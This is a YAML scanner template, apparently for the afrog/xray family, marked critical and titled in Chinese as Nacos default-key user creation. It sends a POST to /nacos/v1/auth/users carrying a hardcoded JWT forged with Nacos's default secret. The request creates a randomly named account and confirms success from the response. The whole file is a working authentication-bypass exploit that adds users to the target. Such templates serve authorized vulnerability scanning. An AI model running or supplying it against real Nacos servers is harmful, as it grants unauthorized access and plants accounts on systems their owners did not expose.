expression: r0()
id: nacos-token-create-user
info:
  author: zan8in
  name: "Nacos \u9ED8\u8BA4\u5BC6\u94A5\u521B\u5EFA\u7528\u6237"
  severity: critical
  verified: true
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'"code":') && response.body.bcontains(b'"message":')
      && response.body.bcontains(b'"data":') && response.body.bcontains(b'create user
      ok!')
    request:
      body: username={{randuser}}&password={{randpass}}
      headers:
        Authorization: Bearer {{token}}
      method: POST
      path: /nacos/v1/auth/users
set:
  randpass: randomLowercase(8)
  randuser: randomLowercase(6)
  token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ
